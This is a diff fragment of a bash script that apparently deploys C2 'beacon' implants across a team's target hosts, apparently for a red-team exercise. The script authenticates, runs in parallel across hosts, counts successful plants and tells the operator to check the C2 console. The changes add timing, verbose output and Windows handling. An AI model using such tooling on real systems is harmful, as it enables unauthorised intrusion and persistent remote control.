   for bin_file in "${BEACON_FILES[@]}"; do
     BEACON_FILE="$bin_file"
     BEACON_NAME="$(basename "$bin_file")"
-    if transfer_exec_one "$ip" "$authed_user" "$hostname" "$authed_proto"; then
+    if transfer_exec_one "$ip" "$authed_user" "$hostname" "$authed_proto" "$is_windows"; then
       ((planted_count++))
     fi
   done
@@ -684,11 +966,14 @@ plant_on_host() {
   # Restore auth state
   USE_KERBEROS=$save_kerberos; AUTH_FLAG="$save_auth_flag"; PASS="$save_pass"
 
+  echo "    [–] ${hostname} total: $(timer_diff "$t0_host" "$(timer_now)")  (${planted_count}/${#BEACON_FILES[@]} planted)"
   [[ $planted_count -gt 0 ]] && return 0 || return 1
 }
 
 # ====================== MAIN ======================
+t0_total=$(timer_now)
 echo "[*] Planting on team ${TEAM}..."
+[[ $VERBOSE -eq 1 ]] && echo "[*] VERBOSE MODE — debug output enabled"
 echo ""
 
 if [[ ${#TARGETS[@]} -eq 1 ]]; then
@@ -704,6 +989,7 @@ else
 
   for host in "${TARGETS[@]}"; do
     (
+      trap - EXIT  # don't inherit parent's cleanup trap
       plant_on_host "$host" > "${TMPDIR}/${host}.log" 2>&1
       echo $? > "${TMPDIR}/${host}.rc"
     ) &
@@ -725,7 +1011,7 @@ else
 fi
 
 echo "=========================================="
-echo "[*] Results: ${PLANTED} host(s) planted, ${FAILED} failed out of ${#TARGETS[@]} targets"
+echo "[*] Results: ${PLANTED} host(s) planted, ${FAILED} failed out of ${#TARGETS[@]} targets  ($(timer_diff "$t0_total" "$(timer_now)"))"
 if [[ $PLANTED -gt 0 ]]; then
   echo "[+] Check your C2 console for new callbacks."
 fi
